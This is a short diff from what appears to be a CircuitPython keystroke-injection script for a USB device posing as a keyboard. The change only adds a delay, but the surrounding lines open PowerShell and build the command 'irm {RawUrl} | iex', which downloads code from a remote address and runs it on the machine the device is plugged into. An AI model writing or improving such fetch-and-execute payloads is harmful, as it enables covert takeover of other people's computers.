@@ -18,6 +18,8 @@ def open(word):
     kbd.send(Keycode.ENTER)
     time.sleep(2)
 
+time.sleep(3)
+
 open("powershell")
 ps = f"irm {RawUrl} | iex"
 
